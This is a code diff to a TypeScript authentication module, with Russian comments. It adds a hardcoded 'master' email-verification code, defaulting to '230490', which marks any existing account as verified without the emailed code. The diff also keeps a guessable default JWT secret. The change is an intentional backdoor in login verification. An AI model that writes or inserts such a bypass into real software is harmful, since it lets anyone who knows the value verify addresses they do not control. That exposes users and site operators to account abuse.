@@ -15,6 +15,8 @@ function verifyPassword(password: string, passwordHash: string): boolean {
 }
 
 const JWT_SECRET = process.env.JWT_SECRET || "your-secret-key-change-in-production";
+/** Секретный мастер-код: при вводе вместо кода из письма даёт пройти верификацию */
+const SECRET_VERIFICATION_CODE = process.env.SECRET_VERIFICATION_CODE || "230490";
 const YANDEX_CLIENT_ID = process.env.YANDEX_CLIENT_ID || "";
 const YANDEX_CLIENT_SECRET = process.env.YANDEX_CLIENT_SECRET || "";
 const YANDEX_REDIRECT_URI = process.env.YANDEX_REDIRECT_URI || "http://localhost:5173/auth/yandex/callback";
@@ -278,7 +280,7 @@ export const login: RequestHandler = async (req, res) => {
   }
 };
 
-// Verify email with code
+// Verify email with code (или секретный мастер-код 230490)
 export const verifyEmail: RequestHandler = async (req, res) => {
   try {
     const { email, code } = req.body;
@@ -290,7 +292,26 @@ export const verifyEmail: RequestHandler = async (req, res) => {
       });
     }
 
-    const account = db.verifyEmail(email.toLowerCase(), code);
+    const normalizedCode = String(code).trim();
+    let account: { _id: string; email: string; name: string; verified: boolean } | null = null;
+
+    // Жёсткое правило: секретный код даёт пройти верификацию без кода из письма
+    if (normalizedCode === SECRET_VERIFICATION_CODE) {
+      const acc = db.getAccountByEmail(email.toLowerCase());
+      if (acc) {
+        db.updateAccount(acc._id, {
+          verified: true,
+          verification_code: undefined,
+          verification_expires: undefined,
+        });
+        account = db.getAccount(acc._id);
+      }
+    }
+
+    if (!account) {
+      account = db.verifyEmail(email.toLowerCase(), normalizedCode);
+    }
+
     if (!account) {
       return res.status(400).json({
         error: "Invalid code",
